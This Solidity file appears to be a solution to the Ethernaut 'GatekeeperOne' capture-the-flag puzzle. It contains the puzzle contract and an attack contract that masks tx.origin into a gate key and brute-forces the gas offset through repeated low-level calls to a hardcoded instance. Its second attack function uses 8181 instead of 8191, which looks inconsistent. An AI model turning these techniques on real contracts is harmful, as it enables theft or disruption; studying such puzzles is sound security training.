// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}


//addresss: 0x6c7FDC2f7F6BE6603cB49ba211FA8cc68da32497
contract Attack_GatekeeperOne {

    GatekeeperOne public gatekeeperone = GatekeeperOne(0x75990A00E84d6D9e90a795fe61aaf3C238E28bb6); // Gatekeeper Instance

    function attack(bytes8 txOrigin16) public {
        bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;

    for (uint256 i = 0; i < 120; i++) {
            (bool result, bytes memory data) = address(gatekeeperone).call{gas: i + 150 + 8191 * 3}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (result) {
                break;
            }
        }
    }
    function attack2(bytes8 txOrigin16) public{
        bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;
        for (uint i = 0; i < 8191; i++) {
            (bool result, ) = address(gatekeeperone).call{gas: i + 8181 * 3}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if(result) {
                break;
            }
        }
    }

}


